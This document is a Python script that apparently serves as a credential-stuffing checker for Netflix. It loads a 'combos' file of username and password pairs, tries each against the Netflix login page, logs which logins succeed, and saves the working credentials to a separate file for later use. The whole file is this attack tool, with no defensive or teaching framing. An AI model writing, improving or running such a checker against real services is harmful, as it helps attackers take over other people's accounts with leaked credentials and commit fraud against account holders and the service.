import json
import logging
import pathlib

import requests
from pathlib import Path


def setup_logger():
    log_format = {
        "timestamp": "%(asctime)s",
        "level": "%(levelname)s",
        "message": "%(message)s"
    }

    logging.basicConfig(
        filename="nf_tester.log",
        level=logging.INFO,
        format=json.dumps(log_format),
        datefmt="%Y-%m-%d %H:%M:%S"
    )


def login_to_netflix(username, password):
    login_url = "https://www.netflix.com/login"

    session = requests.Session()
    response = session.get(login_url)

    if response.status_code == 200:
        login_data = {
            "userLoginId": username,
            "password": password
        }

        response = session.post(login_url, data=login_data)

        if response.url != login_url:
            session.close()
            return True

    session.close()
    return False


def test_netflix_accounts(accounts_file, tested_accounts_file):
    tested_accounts = {}
    num_tested = 0

    if Path(tested_accounts_file).exists():
        with open(tested_accounts_file, "r") as f:
            try:
                tested_accounts = json.load(f)
            except json.decoder.JSONDecodeError:
                tested_accounts = {}

    with open(accounts_file, "r") as f:
        accounts = json.load(f)

        for account, password in accounts.items():
            if account in tested_accounts:
                logging.info(f"Account {account} already tested")
            else:
                if login_to_netflix(account, password):
                    logging.info(f"Account {account} is valid")
                    tested_accounts[account] = password
                else:
                    logging.info(f"Account {account} is invalid")

            num_tested += 1

            if num_tested % 10 == 0:
                with open(tested_accounts_file, "w") as f:
                    json.dump(tested_accounts, f, indent=4)

    with open(tested_accounts_file, "w") as f:
        json.dump(tested_accounts, f, indent=4)

    logging.info("Testing finished")


if __name__ == "__main__":
    accounts_file = pathlib.Path.cwd() / "data" / "nf_combos_100623.json"
    tested_accounts_file = pathlib.Path.cwd() / "log" / "100623_tested_accounts.json"

    setup_logger()
    test_netflix_accounts(accounts_file, tested_accounts_file)
